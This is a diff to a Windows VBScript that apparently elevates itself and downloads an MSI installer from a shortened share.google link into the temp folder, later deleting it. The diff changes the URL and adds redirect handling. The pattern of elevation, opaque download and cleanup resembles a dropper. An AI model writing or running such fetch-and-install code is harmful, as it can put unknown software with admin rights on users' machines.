@@ -10,15 +10,26 @@ If Not WScript.Arguments.Named.Exists("elevated") Then
 End If
 
 Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell
-strUrl = "https://share.google/5icY94HkmAiaVcn86"
+strUrl = "https://share.google/jraH4hXE8DKHc3EXZ"
 strTemp = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
 strFile = strTemp & "\agent_installer.msi"
 
-' Download
-Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+' Download with proper redirect handling
+Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 objXMLHTTP.open "GET", strUrl, False
 objXMLHTTP.send()
 
+' Check for any redirect (301, 302, etc.)
+If objXMLHTTP.Status >= 300 And objXMLHTTP.Status < 400 Then
+    ' Get the redirect location from headers
+    strUrl = objXMLHTTP.getResponseHeader("Location")
+    
+    ' Make a new request to the redirect URL
+    objXMLHTTP.open "GET", strUrl, False
+    objXMLHTTP.send()
+End If
+
+' Check if we got a successful response
 If objXMLHTTP.Status = 200 Then
     Set objADOStream = CreateObject("ADODB.Stream")
     objADOStream.Open
@@ -35,4 +46,6 @@ If objXMLHTTP.Status = 200 Then
     ' Cleanup
     Set objFSO = CreateObject("Scripting.FileSystemObject")
     If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile
+Else
+    WScript.Echo "Download failed with status: " & objXMLHTTP.Status
 End If
